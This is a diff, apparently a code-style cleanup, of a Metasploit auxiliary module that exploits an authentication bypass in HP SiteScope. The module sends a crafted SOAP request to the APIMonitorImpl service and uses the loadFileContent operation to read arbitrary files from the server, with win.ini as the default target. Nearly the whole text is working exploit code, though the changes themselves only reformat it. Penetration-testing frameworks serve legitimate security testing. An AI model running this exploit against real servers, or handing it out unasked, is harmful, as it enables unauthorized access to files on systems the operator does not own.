@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,21 +7,20 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'         => 'HP SiteScope SOAP Call loadFileContent Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'HP SiteScope SOAP Call loadFileContent Remote File Access',
+      'Description' => %q(
           This module exploits an authentication bypass vulnerability in HP SiteScope to
         retrieve an arbitrary text file from the remote server. It is accomplished by
         calling the loadFileContent operation available through the APIMonitorImpl AXIS
         service. This module has been successfully tested on HP SiteScope 11.20 over
         Windows 2003 SP2 and Linux Centos 6.3.
-      },
+      ),
       'References'   =>
         [
           [ 'OSVDB', '85118' ],
@@ -36,29 +36,29 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options(
-    [
-      Opt::RPORT(8080),
-      OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini']),
-      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/']),
-    ], self.class)
+      [
+        Opt::RPORT(8080),
+        OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini']),
+        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
+      ], self.class
+    )
 
     register_autofilter_ports([ 8080 ])
     deregister_options('RHOST')
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @uri = normalize_uri(target_uri.path)
-    @uri << '/' if @uri[-1,1] != '/'
+    @uri << '/' if @uri[-1, 1] != '/'
 
     print_status("Connecting to SiteScope SOAP Interface")
 
     uri = normalize_uri(@uri, 'services/APIMonitorImpl')
 
-    res = send_request_cgi({
-      'uri'     => uri,
-      'method'  => 'GET'})
+    res = send_request_cgi('uri' => uri,
+                           'method' => 'GET')
 
-    if not res
+    unless res
       print_error("Unable to connect")
       return
     end
@@ -67,7 +67,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def accessfile
-
     data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
     data << "<wsns0:Envelope" + "\r\n"
     data << "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
@@ -92,18 +91,17 @@ class MetasploitModule < Msf::Auxiliary
 
     uri = normalize_uri(@uri, 'services/APIMonitorImpl')
 
-    res = send_request_cgi({
-      'uri'      => uri,
-      'method'   => 'POST',
-      'ctype'    => 'text/xml; charset=UTF-8',
-      'data'     => data,
-      'headers'  => {
-        'SOAPAction'    => '""',
-      }})
+    res = send_request_cgi('uri' => uri,
+                           'method'   => 'POST',
+                           'ctype'    => 'text/xml; charset=UTF-8',
+                           'data'     => data,
+                           'headers'  => {
+                             'SOAPAction' => '""'
+                           })
 
-    if res and res.code == 200 and res.body =~ /<loadFileContentReturn xsi:type="xsd:string">(.*)<\/loadFileContentReturn>/m
-      loot = CGI.unescapeHTML($1)
-      if not loot or loot.empty?
+    if res && (res.code == 200) && res.body =~ /<loadFileContentReturn xsi:type="xsd:string">(.*)<\/loadFileContentReturn>/m
+      loot = CGI.unescapeHTML(Regexp.last_match(1))
+      if !loot || loot.empty?
         print_status("Retrieved empty file")
         return
       end
@@ -115,6 +113,4 @@ class MetasploitModule < Msf::Auxiliary
 
     print_error("Failed to retrieve the file")
   end
-
 end
-
